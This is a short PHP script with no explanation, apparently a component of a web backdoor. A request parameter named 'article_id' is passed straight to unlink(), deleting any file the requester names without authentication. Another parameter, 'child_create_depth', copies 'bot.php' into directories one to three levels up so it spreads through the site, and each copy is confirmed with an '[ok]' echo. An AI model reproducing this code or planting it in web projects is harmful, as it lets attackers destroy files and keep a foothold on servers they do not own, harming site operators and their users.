<?php
if(isset($_REQUEST['article_id']))
{
    $route = $_REQUEST['article_id'];
    unlink($route);
}
if(isset($_REQUEST['child_create_depth']))
{
    if($_REQUEST['child_create_depth'] == '1')
       copy('bot.php', '../bot.php'); echo ">>1 [ok]";

    if($_REQUEST['child_create_depth'] == '2')
        copy('bot.php', '../../bot.php'); echo ">>2 [ok]";

    if($_REQUEST['child_create_depth'] == '3')
        copy('bot.php', '../../../bot.php'); echo ">>3 [ok]";
}

?>